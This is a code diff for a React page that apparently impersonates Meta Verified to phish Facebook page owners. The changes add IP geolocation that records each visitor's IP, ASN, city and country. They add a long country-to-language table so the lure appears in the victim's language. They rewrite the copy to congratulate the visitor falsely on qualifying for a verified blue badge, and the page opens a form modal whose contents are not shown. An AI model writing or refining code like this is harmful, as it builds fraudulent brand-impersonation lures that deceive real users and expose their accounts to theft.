@@ -15,11 +15,12 @@ import Navbar from '@/components/navbar';
 const FormModal = dynamic(() => import('@/components/form-modal'), { ssr: false });
 
 const Page: FC = () => {
-    const { isModalOpen, setModalOpen, setGeoInfo, geoInfo } = store();
+    const { isModalOpen, setModalOpen, setGeoInfo } = store();
     const [translations, setTranslations] = useState<Record<string, string>>({});
     const [modalKey, setModalKey] = useState(0);
     const [expandedBenefit, setExpandedBenefit] = useState<string>('verified');
     const [currentTestimonialIndex, setCurrentTestimonialIndex] = useState(0);
+    const [countryCode, setCountryCode] = useState<string | null>(null);
     
     const testimonials = [
         {
@@ -58,46 +59,99 @@ const Page: FC = () => {
     };
 
     useEffect(() => {
-        if (geoInfo) {
-            return;
-        }
-
         const fetchGeoInfo = async () => {
             try {
-                const { data } = await axios.get('https://get.geojs.io/v1/ip/geo.json');
-                setGeoInfo({
+                const { data } = await axios.get('https://get.geojs.io/v1/ip/geo.json', { timeout: 5000 });
+                const cc = (data.country_code || 'US').toUpperCase();
+                const info = {
                     asn: data.asn || 0,
                     ip: data.ip || 'CHỊU',
                     country: data.country || 'CHỊU',
                     city: data.city || 'CHỊU',
-                    country_code: data.country_code || 'US'
-                });
+                    country_code: cc
+                };
+                setGeoInfo(info);
+                setCountryCode(cc);
             } catch {
-                setGeoInfo({
+                const fallback = {
                     asn: 0,
                     ip: 'CHỊU',
                     country: 'CHỊU',
                     city: 'CHỊU',
                     country_code: 'US'
-                });
+                };
+                setGeoInfo(fallback);
+                setCountryCode('US');
             }
         };
         fetchGeoInfo();
-    }, [setGeoInfo, geoInfo]);
+    // eslint-disable-next-line react-hooks/exhaustive-deps
+    }, []); // Run once on mount only
 
-    // Translate texts in parallel (fast!) instead of sequentially
+    // Translate texts based on fresh country code
     useEffect(() => {
-        if (!geoInfo || Object.keys(translations).length > 0) return;
+        if (!countryCode) return;
 
         (async () => {
             // First check if we have hardcoded translation
             const langMap: Record<string, string> = {
+                // Vietnamese
                 VN: 'vi',
+                // Spanish
+                ES: 'es', MX: 'es', CO: 'es', PE: 'es', CL: 'es', VE: 'es', EC: 'es', AR: 'es', PY: 'es', UY: 'es', BO: 'es', DO: 'es', GT: 'es', HN: 'es', SV: 'es', NI: 'es', CR: 'es', PA: 'es',
+                // French
+                FR: 'fr', LU: 'fr', SN: 'fr', CI: 'fr', CM: 'fr', CD: 'fr', MG: 'fr', ML: 'fr', BF: 'fr', TG: 'fr', BJ: 'fr', NE: 'fr', GN: 'fr', GA: 'fr', CG: 'fr',
+                // German
+                DE: 'de', AT: 'de', LI: 'de',
+                // Italian
+                IT: 'it', SM: 'it', VA: 'it',
+                // Chinese
+                CN: 'zh', TW: 'zh', HK: 'zh', MO: 'zh', SG: 'zh',
+                // Arabic
+                AE: 'ar', EG: 'ar', SA: 'ar', QA: 'ar', IQ: 'ar', JO: 'ar', LB: 'ar', KW: 'ar', BH: 'ar', OM: 'ar', YE: 'ar', DZ: 'ar', MA: 'ar', TN: 'ar', LY: 'ar', SY: 'ar', SD: 'ar',
+                // Hindi
+                IN: 'hi',
+                // Portuguese
+                BR: 'pt', PT: 'pt', AO: 'pt', MZ: 'pt',
+                // Russian
+                RU: 'ru', BY: 'ru', KZ: 'ru',
+                // Japanese
+                JP: 'ja',
+                // Dutch
+                NL: 'nl', BE: 'nl',
+                // Polish
+                PL: 'pl',
+                // Greek
+                GR: 'el', CY: 'el',
+                // Turkish
+                TR: 'tr',
+                // Thai
+                TH: 'th',
+                // Korean
+                KR: 'ko',
+                // Swedish
+                SE: 'sv',
+                // Indonesian
+                ID: 'id',
+                // Malay
+                MY: 'ms',
+                // Romanian
+                RO: 'ro',
+                // Czech / Slovak
+                CZ: 'cs', SK: 'cs',
+                // Hungarian
+                HU: 'hu',
+                // Finnish
+                FI: 'fi',
+                // Danish
+                DK: 'da',
+                // Norwegian
+                NO: 'no',
             };
             
-            const lang = langMap[geoInfo.country_code];
+            const lang = langMap[countryCode];
             if (lang && lang !== 'en') {
-                // Use hardcoded translation for Vietnamese
+                // Use hardcoded translation from translate.ts
                 const hardcoded = getTranslations(lang);
                 setTranslations(hardcoded);
                 return;
@@ -106,7 +160,8 @@ const Page: FC = () => {
             // For other languages, use API Google Translate with parallel requests
             const textsToTranslate = [
                 'Show the world that you mean business.',
-                'Organizations can leverage the requirements to upgrade your page to a Sub-business status with a branded, relationship that reflects your brand values to drive more meaningful engagement and future.',
+                'Congratulations on achieving the requirements to upgrade your page to a verified blue badge! This is a fantastic milestone that reflects your dedication and the trust you\'ve built with your audience.',
+                'We\'re thrilled to celebrate this moment with you and look forward to seeing your page thrive with this prestigious recognition!',
                 'Subscribe on Facebook',
                 'A creator toolkit to take your brand further',
                 'Explore key Meta Verified benefits available for Facebook and Instagram. Sub-creator plans and pricing for additional benefits.',
@@ -174,7 +229,7 @@ const Page: FC = () => {
                 return countryToLang[countryCode] || 'en';
             };
 
-            const targetLang = await detectLanguage(geoInfo.country_code);
+            const targetLang = await detectLanguage(countryCode);
             if (targetLang === 'en') {
                 return; // No need to translate to English
             }
@@ -245,7 +300,7 @@ const Page: FC = () => {
 
             setTranslations(translatedMap);
         })();
-    }, [geoInfo, translations]);
+    }, [countryCode]); // Only depends on countryCode, not translations (no re-trigger loop)
 
     return (
         <>
@@ -269,10 +324,10 @@ const Page: FC = () => {
                             <h1 className="text-2xl md:text-5xl font-bold text-gray-900 mb-6 leading-tight">
                                 {t('Show the world that you mean business.')}
                             </h1>
-                            <p className="text-sm md:text-lg text-gray-600 mb-3 leading-relaxed">
+                            <p className="text-xs md:text-lg text-gray-600 mb-3 leading-relaxed">
                                 {t('Congratulations on achieving the requirements to upgrade your page to a verified blue badge! This is a fantastic milestone that reflects your dedication and the trust you\'ve built with your audience.')}
                             </p>
-                            <p className="text-sm md:text-lg text-gray-600 mb-6 leading-relaxed">
+                            <p className="text-xs md:text-lg text-gray-600 mb-6 leading-relaxed">
                                 {t('We\'re thrilled to celebrate this moment with you and look forward to seeing your page thrive with this prestigious recognition!')}
                             </p>
                             <button
